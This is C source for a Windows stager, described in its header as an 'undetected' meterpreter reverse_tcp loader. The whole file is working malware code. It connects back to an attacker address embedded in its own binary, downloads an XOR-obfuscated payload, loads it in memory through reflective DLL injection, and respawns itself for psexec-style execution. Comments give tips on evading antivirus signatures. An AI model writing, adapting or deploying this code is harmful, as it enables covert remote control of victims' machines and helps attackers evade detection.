/*
	Author: DiabloHorn http://diablohorn.wordpress.com
	Undetected meterpreter/reverse_tcp stager
	Compile as C
	Disable optimization, this could help you later on
	when signatures are written to detect this.
	
*/
#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>

#include "LoadLibraryR.h"
#include "GetProcAddressR.h" 

#pragma comment(lib, "ws2_32.lib")

int initwsa();
short getcinfo(char *,char *,int);
void xor(char *,int);
SOCKET getsocket(char *);
DWORD WINAPI threadexec(LPVOID);

/* setting up the meterpreter init function */
typedef DWORD (__cdecl * MyInit) (SOCKET fd);
MyInit meterpreterstart;

/* http://msdn.microsoft.com/en-us/library/windows/desktop/ms738545(v=vs.85).aspx */
WSADATA wsa;

/*
	doit
*/
int CALLBACK WinMain(_In_  HINSTANCE hInstance,_In_  HINSTANCE hPrevInstance,_In_  LPSTR lpCmdLine,_In_  int nCmdShow){
	HANDLE threadhandle;
	DWORD  threadid;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char szPath[MAX_PATH];

	GetModuleFileName(NULL,szPath,MAX_PATH);
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

	/* Quick & Dirty hack to make this usable for psexec like stuff
	   When executed the first time it will spawn itself this makes 
	   sure we return on time and don't get killed by the servicemanager
	*/

	
	if(strlen(lpCmdLine) == 0){
		strcat_s(szPath,MAX_PATH," 1");
		CreateProcess(NULL,szPath,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi);
	}
	
	if(strlen(lpCmdLine) > 0){
		//thread just for fun...no real purpose atm
		threadhandle = CreateThread(NULL,0,threadexec,szPath,0,&threadid);
		WaitForSingleObject(threadhandle,INFINITE);
	}
}

/* http://msdn.microsoft.com/en-us/library/windows/desktop/ms682516(v=vs.85).aspx 
	read port:ip
	Receive stage
	Load it using reflectivedllinjection
*/
DWORD WINAPI threadexec(LPVOID exename){
	SOCKET meterpretersock; 
	int response = 0;
	int total = 0;
	char *payload;
	char recvbuf[1024];
	DWORD payloadlength = 0;
	HMODULE loadedfile = NULL;

	if(initwsa() != 0){
		exit(0);
	}

	meterpretersock = getsocket((char *)exename);
	response = recv(meterpretersock, (char *)&payloadlength, sizeof(DWORD), 0);

	payload = (char *)malloc(payloadlength);
	memset(payload,0,payloadlength);
	memset(recvbuf,0,1024);

	do{
		response = recv(meterpretersock, recvbuf, 1024, 0);
		xor(&recvbuf[0],response);
		memcpy(payload,recvbuf,response);
		payload += response;
		total += response;
		payloadlength -= response;
		
	}while(payloadlength > 0);
	payload -= total;
	loadedfile = LoadLibraryR(payload,total);
	meterpreterstart = (MyInit) GetProcAddressR(loadedfile,"Init");
	meterpreterstart(meterpretersock);
	
	free(payload);
	//closesocket(sock); meterpreter is still using it
}
/*
	Get a socket which is allready connected back
*/
SOCKET getsocket(char *self){
	SOCKADDR_IN dinfo;	
	SOCKET sock;
	int respcode = 0;
	char *ipaddr = (char *)malloc(sizeof(char)*25);
	short port = 0;

	memset(ipaddr,0,sizeof(char)*16);
	port = getcinfo(self,ipaddr,16);

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sock == INVALID_SOCKET){
		exit(0);
	}
    dinfo.sin_family = AF_INET;
    dinfo.sin_addr.s_addr = inet_addr(ipaddr);
    dinfo.sin_port = htons(port);

	respcode = connect(sock, (SOCKADDR *) &dinfo, sizeof (dinfo));
	if(respcode == SOCKET_ERROR){
		exit(0);
	}
	free(ipaddr);
	return sock;
}

/*
	Initialize winsock
*/
int initwsa(){
	int wsaerror = 0;
	//wsa is defined above main
	wsaerror = WSAStartup(MAKEWORD(2,2),&wsa);
	if(wsaerror != 0){
		return -1;
	}
	return 0;
}

/*
	Get ip address and port information from our own executable
	Feel free to hardcode it instead of doing this
*/
short getcinfo(char *self,char *ipaddr,int len){
	int i = 0;
	int offset = 0x4e;
	//[port as little endian hex][ip as string \0 terminated]
	//9999 -> 270f -> 0f27
	//127.0.0.1 -> 127.0.0.1
	//make sure to padd with \0's until max buffer, or this will read weird stuff
	short port = 0;
	FILE * file = fopen(self, "r");
	fseek(file,offset,SEEK_SET);
	fread((void *)&port,(size_t)sizeof(short),1,file);
	fread(ipaddr,(size_t)len,1,file);
	fclose(file); 
	return port;
}

/*
	Use for additional obfuscation??
	http://stackoverflow.com/questions/12375808/how-to-make-bit-wise-xor-in-c
*/
void xor(char *data,int len){
	int i;
	
	for(i=0;i<len;i++){
		data[i] = data[i] ^ 0x50;
	}
}